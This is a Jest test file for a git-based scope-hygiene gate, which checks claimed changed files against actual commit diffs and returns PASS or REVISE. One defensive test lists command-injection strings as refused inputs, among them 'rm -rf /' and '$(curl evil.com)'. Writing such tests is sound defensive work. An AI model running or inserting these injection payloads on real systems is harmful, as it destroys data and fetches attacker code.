// ─── Scope-hygiene gate tests ──────────────────────────────────────
// Per Blueprint §9: ≥10 cases covering three-set computation,
// driftThreshold default + override, nonClaims-suppresses-drift,
// empty-diff edge case, shell-metachar refusal, REVISE/PASS verdict.
//
// Uses real git via execSync against a tmpdir-per-test fixture.

import { execSync } from "node:child_process";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";

import { runScopeHygieneGate } from "../../src/intake/scope-hygiene-gate.js";
import type { ValidationIntakePayload } from "../../src/intake/task-intake.js";

// ─── Fixtures / helpers ────────────────────────────────────────────

function makeTempRepo(): string {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "quack-scope-gate-"));
  execSync("git init -q -b main", { cwd: root, stdio: "ignore" });
  execSync("git config user.email test@quack.local", { cwd: root, stdio: "ignore" });
  execSync("git config user.name Quack-Test", { cwd: root, stdio: "ignore" });
  execSync("git config commit.gpgsign false", { cwd: root, stdio: "ignore" });
  return root;
}

function commitFile(repoRoot: string, relPath: string, content: string, message: string): void {
  const absPath = path.join(repoRoot, relPath);
  fs.mkdirSync(path.dirname(absPath), { recursive: true });
  fs.writeFileSync(absPath, content, "utf-8");
  execSync(`git add ${JSON.stringify(relPath)}`, { cwd: repoRoot, stdio: "ignore" });
  execSync(`git commit -q -m ${JSON.stringify(message)}`, { cwd: repoRoot, stdio: "ignore" });
}

function makePayload(overrides: Partial<ValidationIntakePayload> = {}): ValidationIntakePayload {
  return {
    schemaVersion: 1,
    project: "demo",
    branch: "feature/test",
    commitRange: "HEAD~1..HEAD",
    scope: ["src/a.ts"],
    tests: [{ name: "spec", result: "PASS", evidence: "log.txt" }],
    screenshots: [],
    nonClaims: [],
    knownRisks: [],
    submitter: "tester",
    submittedAt: "2026-05-31T00:00:00Z",
    ...overrides,
  } as ValidationIntakePayload;
}

describe("runScopeHygieneGate", () => {
  let repoRoot: string;

  beforeEach(() => {
    repoRoot = makeTempRepo();
    // Initial commit so HEAD~1 resolves in subsequent ranges.
    commitFile(repoRoot, "README.md", "seed\n", "seed");
  });

  afterEach(() => {
    fs.rmSync(repoRoot, { recursive: true, force: true });
  });

  // ─── (a) Full claim match → PASS, confirmed populated. ─────────
  it("PASS when all claimed files are touched by the commit range", async () => {
    commitFile(repoRoot, "src/a.ts", "export const a = 1;\n", "add a");
    commitFile(repoRoot, "src/b.ts", "export const b = 2;\n", "add b");

    const payload = makePayload({
      scope: ["src/a.ts", "src/b.ts"],
      commitRange: "HEAD~2..HEAD",
    });
    const result = await runScopeHygieneGate(repoRoot, payload, 5);

    expect(result.verdict).toBe("PASS");
    expect(result.confirmed.sort()).toEqual(["src/a.ts", "src/b.ts"]);
    expect(result.claimed_but_unchanged).toEqual([]);
    expect(result.changed_but_unclaimed).toEqual([]);
    expect(result.driftThreshold).toBe(5);
    expect(result.reasons).toEqual([]);
  });

  // ─── (b) Inflation → REVISE with claimed_but_unchanged populated.
  it("REVISE when a claimed file is not touched (scope inflation)", async () => {
    commitFile(repoRoot, "src/a.ts", "export const a = 1;\n", "add a");

    const payload = makePayload({
      scope: ["src/a.ts", "src/never-touched.ts"],
      commitRange: "HEAD~1..HEAD",
    });
    const result = await runScopeHygieneGate(repoRoot, payload, 5);

    expect(result.verdict).toBe("REVISE");
    expect(result.confirmed).toEqual(["src/a.ts"]);
    expect(result.claimed_but_unchanged).toEqual(["src/never-touched.ts"]);
    expect(result.reasons).toContain("scope_inflation");
  });

  // ─── (c) Drift below threshold → PASS, changed_but_unclaimed populated.
  it("PASS when drift is below driftThreshold (informational)", async () => {
    commitFile(repoRoot, "src/a.ts", "export const a = 1;\n", "add a");
    commitFile(repoRoot, "src/incidental-1.ts", "x\n", "incidental 1");
    commitFile(repoRoot, "src/incidental-2.ts", "x\n", "incidental 2");

    const payload = makePayload({
      scope: ["src/a.ts"],
      commitRange: "HEAD~3..HEAD",
    });
    const result = await runScopeHygieneGate(repoRoot, payload, 5);

    expect(result.verdict).toBe("PASS");
    expect(result.confirmed).toEqual(["src/a.ts"]);
    expect(result.changed_but_unclaimed.sort()).toEqual([
      "src/incidental-1.ts",
      "src/incidental-2.ts",
    ]);
    expect(result.reasons).toEqual([]);
  });

  // ─── (d) Drift above threshold with empty nonClaims → REVISE. ──
  it("REVISE when drift exceeds driftThreshold and nonClaims is empty", async () => {
    commitFile(repoRoot, "src/a.ts", "export const a = 1;\n", "add a");
    for (let i = 1; i <= 6; i++) {
      commitFile(repoRoot, `src/extra-${i}.ts`, "x\n", `extra ${i}`);
    }

    const payload = makePayload({
      scope: ["src/a.ts"],
      commitRange: "HEAD~7..HEAD",
      nonClaims: [],
    });
    const result = await runScopeHygieneGate(repoRoot, payload, 5);

    expect(result.verdict).toBe("REVISE");
    expect(result.changed_but_unclaimed.length).toBe(6);
    expect(result.reasons).toContain("scope_drift_without_nonclaims");
  });

  // ─── (e) Drift above threshold suppressed by nonClaims → PASS. ─
  // SPEC SUCCESS CRITERION SC7.
  it("PASS when drift files are explicitly enumerated in nonClaims", async () => {
    commitFile(repoRoot, "src/a.ts", "export const a = 1;\n", "add a");
    commitFile(repoRoot, "package-lock.json", "{}\n", "lockfile");
    commitFile(repoRoot, "tsconfig.json", "{}\n", "ts config");

    const payload = makePayload({
      scope: ["src/a.ts"],
      commitRange: "HEAD~3..HEAD",
      // nonClaims lists the incidental files AND has length > 0 — both the
      // string-set filter AND the empty-nonClaims drift trigger are tested here.
      nonClaims: ["package-lock.json", "tsconfig.json"],
    });
    const result = await runScopeHygieneGate(repoRoot, payload, 1);

    expect(result.verdict).toBe("PASS");
    expect(result.changed_but_unclaimed).toEqual([]);
    expect(result.reasons).toEqual([]);
  });

  // ─── (f) Custom driftThreshold from adapter (caller passes it in).
  it("REVISE when custom driftThreshold is exceeded", async () => {
    commitFile(repoRoot, "src/a.ts", "export const a = 1;\n", "add a");
    commitFile(repoRoot, "src/x1.ts", "x\n", "x1");
    commitFile(repoRoot, "src/x2.ts", "x\n", "x2");
    commitFile(repoRoot, "src/x3.ts", "x\n", "x3");

    const payload = makePayload({
      scope: ["src/a.ts"],
      commitRange: "HEAD~4..HEAD",
    });
    const result = await runScopeHygieneGate(repoRoot, payload, 2);

    expect(result.verdict).toBe("REVISE");
    expect(result.changed_but_unclaimed.length).toBe(3);
    expect(result.driftThreshold).toBe(2);
    expect(result.reasons).toContain("scope_drift_without_nonclaims");
  });

  // ─── (g) Empty diff with empty scope → PASS, all sets empty. ────
  // The empty-diff edge case from blueprint §9: range resolves but yields no
  // changed files. With an empty scope set, all three result sets are empty
  // and the gate returns PASS. (With a non-empty scope, the empty diff
  // produces inflation — covered by test (g2) below.)
  it("PASS when commit range resolves but contains no changes (empty scope)", async () => {
    const payload = makePayload({
      scope: [],
      commitRange: "HEAD..HEAD",
    });
    // scope.length === 0 violates the Zod minItems:1, but runScopeHygieneGate
    // itself does NOT re-enforce the Zod shape — it operates on whatever
    // payload it receives. The route layer is the Zod boundary.
    const result = await runScopeHygieneGate(repoRoot, payload, 5);

    expect(result.confirmed).toEqual([]);
    expect(result.claimed_but_unchanged).toEqual([]);
    expect(result.changed_but_unclaimed).toEqual([]);
    expect(result.verdict).toBe("PASS");
    expect(result.reasons).toEqual([]);
  });

  // ─── (g2) Empty diff with non-empty scope → REVISE (inflation). ─
  it("REVISE on empty diff when scope claims any file (inflation)", async () => {
    const payload = makePayload({
      scope: ["src/a.ts"],
      commitRange: "HEAD..HEAD",
    });
    const result = await runScopeHygieneGate(repoRoot, payload, 5);

    expect(result.changed_but_unclaimed).toEqual([]);
    expect(result.claimed_but_unchanged).toEqual(["src/a.ts"]);
    expect(result.verdict).toBe("REVISE");
    expect(result.reasons).toContain("scope_inflation");
  });

  // ─── (h) Invalid commit range → throws. ────────────────────────
  it("throws when commitRange does not resolve via git rev-parse", async () => {
    const payload = makePayload({
      commitRange: "deadbeef..feedface",
    });
    await expect(runScopeHygieneGate(repoRoot, payload, 5)).rejects.toThrow(/did not resolve/);
  });

  // ─── (i) Shell metachar in commitRange → throws BEFORE git invocation.
  it("refuses commitRange with backtick/$/; or newline before invoking git", async () => {
    const bad = ["a..b; rm -rf /", "$(curl evil.com)..HEAD", "a..b`whoami`", "a..b\nINJECTED"];
    for (const commitRange of bad) {
      const payload = makePayload({ commitRange });
      await expect(runScopeHygieneGate(repoRoot, payload, 5)).rejects.toThrow(
        /shell metacharacters|newlines/,
      );
    }
  });

  // ─── (j) Drift exactly AT threshold → PASS (not strictly greater).
  it("PASS when changed_but_unclaimed.length === driftThreshold (not strictly greater)", async () => {
    commitFile(repoRoot, "src/a.ts", "export const a = 1;\n", "add a");
    commitFile(repoRoot, "src/x1.ts", "x\n", "x1");
    commitFile(repoRoot, "src/x2.ts", "x\n", "x2");

    const payload = makePayload({
      scope: ["src/a.ts"],
      commitRange: "HEAD~3..HEAD",
    });
    const result = await runScopeHygieneGate(repoRoot, payload, 2);

    expect(result.verdict).toBe("PASS");
    expect(result.changed_but_unclaimed.length).toBe(2);
    expect(result.reasons).toEqual([]);
  });

  // ─── (k) Inflation always REVISEs even when drift is empty + nonClaims declared.
  it("REVISE on inflation even when drift is empty (inflation is unconditional)", async () => {
    commitFile(repoRoot, "src/a.ts", "export const a = 1;\n", "add a");

    const payload = makePayload({
      scope: ["src/a.ts", "src/missing.ts"],
      commitRange: "HEAD~1..HEAD",
      nonClaims: ["whatever.ts"], // does not suppress inflation
    });
    const result = await runScopeHygieneGate(repoRoot, payload, 5);

    expect(result.verdict).toBe("REVISE");
    expect(result.reasons).toContain("scope_inflation");
    expect(result.claimed_but_unchanged).toEqual(["src/missing.ts"]);
  });

  // ─── (l) Default driftThreshold 5 surfaced in result. ──────────
  it("surfaces the driftThreshold the gate evaluated against in the result", async () => {
    commitFile(repoRoot, "src/a.ts", "export const a = 1;\n", "add a");

    const payload = makePayload({
      scope: ["src/a.ts"],
      commitRange: "HEAD~1..HEAD",
    });
    const result = await runScopeHygieneGate(repoRoot, payload, 5);

    expect(result.driftThreshold).toBe(5);
  });
});
